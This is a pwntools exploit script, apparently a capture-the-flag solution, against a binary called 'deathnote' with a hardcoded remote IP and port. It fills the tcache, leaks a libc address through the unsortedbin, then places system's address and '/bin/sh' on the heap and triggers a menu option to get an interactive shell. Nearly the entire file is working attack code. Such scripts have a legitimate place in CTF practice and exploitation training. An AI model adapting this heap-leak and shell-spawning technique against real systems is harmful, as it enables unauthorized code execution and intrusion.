#!/usr/bin/python3
from pwn import *

# Set up the target binary by specifying the ELF file
elf = context.binary = ELF("deathnote")
libc = libc = ELF(elf.runpath + b"/libc.so.6")

# Defining the GDB script that will be used when running the
# binary
gs = '''
continue
'''

# Launch the binary with GDB, without GDB or REMOTE based on
# the command-line arguments
def start():
    if args.REMOTE:
        return remote("94.237.63.46", 39443)
    else:
        if args.GDB:
            return gdb.debug(elf.path, gdbscript=gs)
        else:
            return process(elf.path)

def malloc(size, idx, data):
    io.sendline(b"1")
    io.sendlineafter("💀 ", f"{size}".encode())
    io.sendlineafter("💀 ", f"{idx}".encode())
    io.sendlineafter("💀 ", data)
    io.recvuntil("💀 ")

def free(idx):
    io.sendline(b"2")
    io.sendlineafter("💀 ", f"{idx}".encode())
    io.recvuntil("💀 ")

def read(idx):
    io.sendline(b"3")
    io.sendlineafter("💀 ", f"{idx}".encode())
    io.recvuntil(b": ")
    data = io.recvuntil("💀 ")
    return data

def call():
    io.sendline(b"42")

io = start()

#============================================================
#                    EXPLOIT GOES HERE
#============================================================

# Allocate all necessary chunks
malloc(128, 0, b"A")
malloc(128, 1, b"A")
malloc(128, 2, b"A")
malloc(128, 3, b"A")
malloc(128, 4, b"A")
malloc(128, 5, b"A")
malloc(128, 6, b"A")
malloc(128, 7, b"A")
malloc(128, 8, b"A") # Guard against consolidation with the top chunk

# Fill the tcache bin of size 0x90 to ensure the next 0x90 chunk allocation 
# goes into the unsortedbin.
free(0) # 0x90 tcache 1
free(1) # 0x90 tcache 2
free(2) # 0x90 tcache 3
free(3) # 0x90 tcache 4
free(4) # 0x90 tcache 5
free(5) # 0x90 tcache 6
free(6) # 0x90 tcache 7
free(7) # unsortedbin

# Leak the unsortedbin address which is in libc
data = read(7)

# Calculate libc address by substracting the leaked unsortedbin address
# with its offset in libc
libc.address = u64(data[:6] + b"\x00\x00") - 0x21ace0
info("libc @ 0x%x", libc.address)

# Setting up the parameters to call system(/bin/sh)
system = hex(libc.sym.system)
malloc(128, 0, f"{system}")
malloc(128, 1, "/bin/sh\0")

# Call system(/bin/sh) with the 42 program option
call()

#============================================================

# Interact with the process
io.interactive()
